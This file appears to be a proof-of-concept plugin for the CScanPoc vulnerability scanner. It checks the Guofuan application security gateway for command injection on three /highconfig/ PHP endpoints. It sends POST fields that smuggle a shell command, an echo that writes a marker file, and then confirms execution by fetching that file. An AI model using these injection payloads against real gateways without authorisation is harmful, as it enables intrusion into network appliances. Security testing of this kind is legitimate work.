# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import random


class Vuln(ABVuln):
    vuln_id = 'Gfapki_0009'  # 平台漏洞编号，留空
    name = '国富安应用安全网关命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        国富安应用安全网关多处命令执行。
        /highconfig/ha.php
        /highconfig/ha_old.php
        /highconfig/hot.php
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '国富安应用安全网关'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9933fc05-c534-417d-a423-feb3dd541dd7'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            arg = self.target
            content_type = 'Content-Type: application/x-www-form-urlencoded'
            urls = [
                arg + '/highconfig/ha.php',
                arg + '/highconfig/ha_old.php',
                arg + '/highconfig/hot.php'
            ]
            posts = [
                'name=a*;echo%20testvul0>test.txt',
                'ok=1&float_ip=a;echo%20testvul1>test.txt',
                'hand=1&localip=a;echo%20testvul2>test.txt',
            ]
            verify_url = arg + '/highconfig/test.txt'
            for i in range(len(urls)):
                url = urls[i]
                post = posts[i]
                code, head, res, err, _ = hh.http(
                    url, post, header=content_type)
                if (code != 200) and (code != 302):
                    continue
                # 验证
                code, head, res, err, _ = hh.http(verify_url)
                # print res
                if (code == 200) and ('testvul'+str(i) in res):
                    #security_hole('Command execution: ' + url + ' POST:' + post)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
